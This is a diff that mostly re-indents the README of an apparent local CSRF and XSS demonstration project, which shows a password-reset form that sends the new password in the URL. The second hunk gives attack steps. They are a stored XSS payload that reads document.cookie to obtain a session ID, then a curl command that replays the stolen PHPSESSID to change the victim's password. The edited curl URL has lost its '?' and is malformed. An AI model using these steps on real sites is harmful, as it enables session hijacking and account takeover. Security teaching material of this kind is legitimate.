@@ -28,23 +28,23 @@ Getting Started
 	
 	<form action="http://localhost/csrf/pppp.php?new_pass=&re_pass=&re_password=Reset+Password">
 		<dl>
-			<dt>
-				New Password
-			</dt>
-				<dd>
-					<input type="password" name="new_pass" placeholder="New Password..." value="newpass"  required />
-				</dd>
+		<dt>
+		New Password
+		</dt>
+		<dd>
+		<input type="password" name="new_pass" placeholder="New Password..." value="newpass"  required />
+		</dd>
 		</dl>
 		<dl>
-			<dt> 
-				Retype New Password
-			</dt>
-				<dd>
-					<input type="password" name="re_pass" placeholder="Retype New Password..." value="newpass" required />
-				</dd>
+		<dt> 
+		Retype New Password
+		</dt>
+		<dd>
+		<input type="password" name="re_pass" placeholder="Retype New Password..." value="newpass" required />
+		</dd>
 		</dl>
 		<p align="center">
-			<input type="submit" class="btn" value="Reset Password" name="re_password" />
+		<input type="submit" class="btn" value="Reset Password" name="re_password" />
 		</p>
 	</form>
 	
@@ -54,11 +54,12 @@ Getting Started
 	Create a local connection to access the website. 
 	For firefox,
 		View page for uploading composition i.e., upload.php, write "<script>alert(document.cookie)</script>" without quotes to get the Session ID of the user.
-	For chrome, inspect element to get Session ID of the user.
-	On linux machine run the following to change password as "newpassword".
-	curl --cookie "PHPSESSID= userSessionID" --location "serverip/csrf/pppp.php?new_pass=newpassword&re_pass=newpassword&re_password=Reset+Password" | grep "Password Changed!"
-	Password is changed to "newpassword". 
+	For chrome, 
+		Inspect element to get Session ID of the user.
+		On linux machine run the following to change password as "newpassword".
+curl --cookie "PHPSESSID=userSessionID" --location "serverip/csrf/pppp.phpnew_pass=newpassword&re_pass=newpassword&re_password=Reset+Password" | grep "Password Changed!"
+		Password is changed to "newpassword". 
 	
 License
-This project is licensed under the  GNU GENERAL PUBLIC LICENSE - see the LICENSE.md file for details
+	This project is licensed under the  GNU GENERAL PUBLIC LICENSE - see the LICENSE.md file for details
 	
